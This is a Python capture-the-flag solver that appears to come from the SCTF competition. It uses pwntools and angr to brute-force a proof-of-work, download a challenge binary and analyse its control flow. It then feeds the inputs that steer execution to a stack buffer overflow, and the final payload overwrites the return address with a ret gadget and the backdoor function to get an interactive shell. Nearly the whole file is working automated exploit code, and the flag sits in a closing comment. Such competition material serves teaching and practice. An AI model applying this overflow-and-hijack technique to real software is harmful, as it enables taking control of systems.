import angr
import base64
import struct
import hashlib
from pwn import *
from am_graph import to_supergraph
from collections import Counter, defaultdict

p = remote('123.60.82.85', 1447)
p.recvuntil(b'sha256(xxxx + ')
data = p.recv()
pos = data.find(b') ==')
suffix = data[:pos].decode()
sha256 = data[pos + 5: pos + 69].decode()

printable = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
for a in printable:
	for b in printable:
		for c in printable:
			for d in printable:
				_str = (a + b + c + d + suffix).encode()
				if hashlib.sha256(_str).hexdigest() == sha256:
					ans = a + b + c + d
					p.sendline(ans.encode())
					data = p.recvuntil(b'==end==')
					fw = open('chall', 'wb')
					file_data = base64.b64decode(data[:-8])
					fw.write(file_data)
					fw.close()
					# p.close()
					break
			else:
				continue
			break
		else:
			continue
		break
	else:
		continue
	break

# --------------------------------------------------------------------------------

MIN_STR_LEN = 3
STR_LEN = 255
ALLOWED_CHARS = b'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-/_'
EXTENDED_ALLOWED_CHARS = ALLOWED_CHARS + b"%,.;+=_)(*&^%$#@!~`?|<>{}[] \""
SEPARATOR_CHARS = ('-', '_')

def get_string(p, mem_addr, extended=False):
    """
    Get a string from a memory address
    :param p: angr project
    :param mem_addr: memory address
    :param extended: use extended set of characters
    :return: the string
    """

    bin_bounds = (p.loader.main_object.min_addr, p.loader.main_object.max_addr)
    try:
        text_bounds = (p.loader.main_object.sections_map['.text'].min_addr,
                       p.loader.main_object.sections_map['.text'].max_addr)
    except:
        text_bounds = None

    # check if the address contain another address
    try:
        endianess = '<I' if 'LE' in p.arch.memory_endness else '>I'
        tmp_addr = struct.unpack(
            endianess, ''.join(p.loader.memory.read_bytes(mem_addr, p.arch.bytes))
        )[0]
    except:
        tmp_addr = None

    # if the .text exists, we make sure that the actual string
    # is someplace else.
    if text_bounds is not None and text_bounds[0] <= mem_addr <= text_bounds[1]:
        # if the indirect address is not an address, or it points to the text segment,
        # or outside the scope of the binary
        if not tmp_addr or text_bounds[0] <= tmp_addr <= text_bounds[1] or \
               tmp_addr < bin_bounds[0] or tmp_addr > bin_bounds[1]:
            return ''

    # get string representation at mem_addr
    cnt = p.loader.memory.load(mem_addr, STR_LEN)
    string_1 = get_mem_string(cnt, extended=extended)
    string_2 = ''

    try:
        if tmp_addr and bin_bounds[0] <= tmp_addr <= bin_bounds[1]:
            cnt = p.loader.memory.load(tmp_addr, STR_LEN)
            string_2 = get_mem_string(cnt)
    except:
        string_2 = ''

    # return the most probable string
    candidate = string_1 if len(string_1) > len(string_2) else string_2
    return candidate if len(candidate) >= MIN_STR_LEN else ''

def get_mem_string(mem_bytes, extended=False):
    """
    Return the set of consecutive ASCII characters within a list of bytes
    :param mem_bytes: list of bytes
    :param extended: use extended list of characters
    :return: the longest string found
    """

    tmp = ''
    chars = EXTENDED_ALLOWED_CHARS if extended else ALLOWED_CHARS

    for c in mem_bytes:
        if c not in chars:
            break
        tmp += chr(c)

    return tmp

# --------------------------------------------------------------------------------

# p = process('./chall')

# context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = 'debug'

print('open it!')
proj = angr.Project('./chall', load_options = {'auto_load_libs': False})
cfg = proj.analyses.CFGFast()

ret_addr = None
main_func = cfg.kb.functions['main']
printf_addr = hex(cfg.kb.functions['printf'].addr)
check_sum_addr = hex(cfg.kb.functions['_Z5fksthPKcS0_'].addr)
input_val_addr = hex(cfg.kb.functions['_Z9input_valv'].addr)
input_line_addr = hex(cfg.kb.functions['_Z10input_linePcm'].addr)
backdoor_addr = cfg.kb.functions['_Z8backdoorv'].addr

cfg = main_func.transition_graph
supergraph = to_supergraph(cfg)

prologue_node = None
retn_node = None
for node in supergraph.nodes():
	if supergraph.in_degree(node) == 0:
		prologue_node = node
	if supergraph.out_degree(node) == 0:
		retn_node = node

	if prologue_node is not None and retn_node is not None:
		break

candidates = []
for prev_node in supergraph.predecessors(retn_node):
	for prev_prev_node in supergraph.predecessors(prev_node):
			candidates.append(prev_prev_node.addr)

sink_prev_addr = Counter(candidates).most_common()[:-2:-1][0][0]

sink_node = None
for node in supergraph.nodes():
	if node.addr == sink_prev_addr:
		for next_node in supergraph.successors(node):
			if next_node.addr in candidates:
				sink_node = next_node
				break
		break

allow_addr = []
avoid_addr = []
exec_path = []

cur_node = sink_node
while cur_node.addr != prologue_node.addr:
	allow_addr.append(cur_node.addr)
	prev_node = list(supergraph.predecessors(cur_node))[0]
	exec_path.append(prev_node)
	for next_node in supergraph.successors(prev_node):
		if next_node.addr in allow_addr:
			pass
		else:
			avoid_addr.append(next_node.addr)
	cur_node = prev_node

exec_path = exec_path[::-1]

for cfg_node in retn_node.cfg_nodes:
    block = proj.factory.block(cfg_node.addr)
    insns = block.capstone.insns

    for i in range(len(insns)):
        inst = insns[i]
        if inst.mnemonic == 'ret':
            if ret_addr is None:
                ret_addr = inst.address

for node in exec_path:
    print(hex(node.addr))

    input_val_len = 0
    input_line_start = 0
    input_line_length = 0
    input_line_xor_dict = defaultdict(int)
    _str = ''

    after_printf = False
    after_check_sum = False

    for cfg_node in node.cfg_nodes:
        block = proj.factory.block(cfg_node.addr)
        insns = block.capstone.insns

        if after_printf and len(block.capstone.insns) == 4:
            after_printf = False

            inst = insns[0]
            assert inst.mnemonic == 'lea'
            dst = inst.op_str.split(', ')[1]
            dst = dst.split(' - ')[1][:-1]
            input_line_start = int(dst, 16)

            inst = insns[1]
            assert inst.mnemonic == 'mov'
            input_line_length = inst.op_str.split(', ')[1]
            input_line_length = int(input_line_length, 16)

        elif after_check_sum and len(block.capstone.insns) == 4:
            after_check_sum = False

            inst = insns[3]
            assert inst.mnemonic == 'jz' or inst.mnemonic == 'je'
            jmp_dst = inst.op_str
            if int(jmp_dst, 16) in allow_addr:
                # print('give a wrong answer')
                p.send(b'\xaa' * input_line_length)
                print(b'\xaa' * input_line_length)
            else:
                # print('give a right answer')
                temp = list(_str.encode())
                for i in range(input_line_length):
                    to_xor_num = input_line_xor_dict[input_line_start - i]
                    temp[i] ^= to_xor_num
                p.send(bytes(temp))
                print(bytes(temp))
        else:
            for i in range(len(insns)):
                inst = insns[i]

                if inst.mnemonic == 'cmp':
                    cmp_num = str(int(inst.op_str.split(', ')[1], 16))
                    next_inst = insns[i + 1]
                    assert next_inst.mnemonic == 'jne' or next_inst.mnemonic == 'jnz'
                    jmp_dst = next_inst.op_str
                    if int(jmp_dst, 16) in allow_addr:
                        for i in range(input_val_len):
                            p.send(b'0 ')
                    else:
                        p.send(b'0 ')
                        p.send(b'0 ')
                        p.send(f'{cmp_num} '.encode())
                        for i in range(input_val_len - 3):
                            p.send(b'0 ')

                if inst.mnemonic == 'call' and inst.op_str == input_val_addr:
                    input_val_len += 1

                if inst.mnemonic == 'call' and inst.op_str == printf_addr:
                    after_printf = True

                if inst.mnemonic == 'xor' and inst.size == 3:
                    to_xor = inst.op_str.split(', ')[1]

                    next_inst = insns[i + 1]
                    assert next_inst.mnemonic == 'mov'
                    dst = next_inst.op_str.split(', ')[0]
                    dst = dst.split(' - ')[1][:-1]
                    input_line_xor_dict[int(dst, 16)] = int(to_xor, 16) & 0xff

                if inst.mnemonic == 'call' and inst.op_str == check_sum_addr:
                    prev_prev_inst = insns[i - 2]
                    try:
                        str_addr_offset = prev_prev_inst.op_str.split(', ')[1]
                    except:
                        print('error', hex(inst.address))
                    str_addr_offset = str_addr_offset.split(' + ')[1][:-1]
                    str_addr = prev_prev_inst.address + 7 + int(str_addr_offset, 16)
                    _str = get_string(proj, str_addr)
                    assert len(_str) == input_line_length
                    after_check_sum = True

for cfg_node in sink_node.cfg_nodes:
    block = proj.factory.block(cfg_node.addr)
    insns = block.capstone.insns

    for i in range(len(insns)):
        inst = insns[i]

        if inst.mnemonic == 'call' and inst.op_str == input_line_addr:
            prev_prev_prev_inst = insns[i - 3]
            assert prev_prev_prev_inst.mnemonic == 'lea'
            sink_addr = prev_prev_prev_inst.op_str.split(', ')[1]
            sink_addr = sink_addr.split(' - ')[1][:-1]
            sink_addr = int(sink_addr, 16)
            prev_prev_inst = insns[i - 2]
            assert prev_prev_inst.mnemonic == 'mov'
            input_length = prev_prev_inst.op_str.split(', ')[1]
            input_length = int(input_length, 16)
            payload = (b'a' * (sink_addr + 8) + p64(ret_addr) + p64(backdoor_addr)).ljust(input_length, b'a')
            print(payload)
            print('ret_addr:', hex(ret_addr))
            p.send(payload)
            p.interactive()

# SCTF{ANGR_POWERFUL_TOOOOOOOL_STACKKKKK_EASY!}